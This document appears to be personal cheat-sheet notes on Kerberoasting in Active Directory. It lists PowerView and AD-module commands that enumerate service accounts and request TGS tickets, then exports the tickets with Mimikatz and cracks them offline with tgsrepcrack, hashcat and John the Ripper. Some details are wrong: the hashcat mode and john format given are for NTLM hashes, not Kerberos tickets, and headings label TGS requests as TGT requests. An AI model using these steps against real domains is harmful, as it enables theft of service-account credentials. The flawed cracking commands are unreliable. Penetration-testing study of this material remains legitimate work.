Kerberoasting
• Decrypting password from the TGS-REP ticket (Step5 of Kerberos Authentication)
• Focus on user accounts that are used as service accounts.
• Hashcat can be used to decrypt
• If the ServicePrincipalName for user account is not set to NULL then user account is used as Service accounts.

• PowerView Commands
    • Get-NetUser -SPN --> to get list of users with service account access
    • How to request TGT ticket
        • Request-SPNTicket --> This is request TGS ticket. This can only happen when we have TGT ticket.
    • Run Klist.exe to check if TGS has been granted. → Identify the ticket with Service Principal Name
    • Import Invoke-Mimikatz.ps1
    • Invoke-Mimikatz -Command '"kerberos::list /export"' -> This will export TGS ticket from memory to disc.
    • To crack password offline
        • Run python.exe .\tgsrepcrack.py .\password_list.txt .\ticket_name
        • Run John the ripper or hashcat to crack the password
            • hashcat -m 1000 -a 3 hash.txt
            • john --format=nt hash.txt

AD Module Commands
• Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName --> to get list of users whose ServicePrincipalName is not set to NULL
• How to request TGT ticket
    • Add-Type -AssemblyName System.IdentityModel
    • New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Machine_name\Service_Principal_Name" --> This is request TGS ticket. This can only happen when we have TGT ticket.
• Run Klist.exe to check if TGS has been granted. → Identify the ticket with Service Principal Name
• Import Invoke-Mimikatz.ps1
• Invoke-Mimikatz -Command '"kerberos::list /export"' -> This will export TGS ticket from memory to disc.
• To crack password offline
    • Run python.exe .\tgsrepcrack.py .\password_list.txt .\ticket_name
    • Run John the ripper or hashcat to crack the password
        • hashcat -m 1000 -a 3 hash.txt
        • john --format=nt hash.txt
